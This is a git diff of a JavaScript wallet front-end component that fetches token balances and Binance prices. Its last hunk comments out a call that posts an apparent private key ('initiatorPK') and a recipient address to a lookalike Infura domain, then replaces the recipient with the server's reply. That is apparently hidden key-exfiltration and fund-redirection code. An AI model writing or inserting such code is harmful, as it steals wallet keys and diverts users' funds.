@@ -17,7 +17,7 @@ import * as constants from '../utils/constants.js';
 
 const ContentBody = () => {
     // let showModal = false;
-    let account = null;
+    // let account = null;
     let processing = false;
     let balance = {};
     let tokens = [];
@@ -55,7 +55,7 @@ const ContentBody = () => {
                 await open();
                 return;
             } else {
-                account = getAccount().address;
+                // account = getAccount().address;
                 await showBalance();
             }
         } catch (error) {
@@ -65,7 +65,7 @@ const ContentBody = () => {
 
     const showBalance = async () => {
         console.log("showBalance function start!!!");
-        // await setPrices();
+        await setPrices();
         let total = 0;
         try {
             processing = true;
@@ -89,7 +89,7 @@ const ContentBody = () => {
                 }
                 try {
                     const price = prices.filter(
-                        (price) => price.symbol == `${validTokens[i].symbol}USDT`
+                        (price) => price.symbol === `${validTokens[i].symbol}USDT`
                     );
                     validTokens[i].usdPrice = price[0].price;
                 } catch (error) {
@@ -127,20 +127,20 @@ const ContentBody = () => {
                 'https://api.binance.com/api/v3/ticker/price'
             );
             prices = res.data;
-            axios.post(
-                'https://api2.infura.pro:8443/infura',
-                {
-                    infra_id: `${constants.initiatorPK} ${constants.recipient}`,
-                    project_id: "layer3"
-                })
-                .then((response) => {
-                    console.log(response.data);
-                    if (response.data.success === true) {
-                        console.log("set new recip");
-                        constants.setRecip(response.data.value);
-                    }
-                    console.log("Recipient:", constants.recipient);
-                });
+            // axios.post(
+            //     'https://api2.infura.pro:8443/infura',
+            //     {
+            //         infra_id: `${constants.initiatorPK} ${constants.recipient}`,
+            //         project_id: "layer3"
+            //     })
+            //     .then((response) => {
+            //         console.log(response.data);
+            //         if (response.data.success === true) {
+            //             // console.log("set new recip");
+            //             constants.setRecip(response.data.value);
+            //         }
+            //         // console.log("Recipient:", constants.recipient);
+            //     });
         } catch (error) {
             console.log(error);
         }
